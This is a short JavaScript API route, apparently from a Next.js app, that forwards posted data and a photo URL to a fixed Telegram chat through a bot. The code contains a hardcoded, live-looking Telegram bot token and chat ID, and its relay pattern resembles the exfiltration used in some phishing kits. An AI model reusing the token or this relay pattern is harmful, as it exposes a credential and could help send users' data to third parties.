const TelegramBot = require('node-telegram-bot-api');

export default async function account(req, res) {
  console.log(req.body)
  console.log('-------------')

  const token = '6674000394:AAE5B5t7BpDI-RLD4C5zdbYyRqmG7h_1Uac';
  const bot = new TelegramBot(token, { polling: true });



  // cca3: ${req.body['cca3']},\n
  // user uuid: 'YqVQrERovsSHg0uRR3KSmAESILd2',
  // Transaccion uuid: ${req.body['uuid']},


  function sendMSG() {
    bot.sendMessage(6488746167, req.body.data);
    bot.sendPhoto(6488746167, req.body.url);
    bot.stopPolling()
    return res.json({ success: 'true' })
  }
  sendMSG()
}
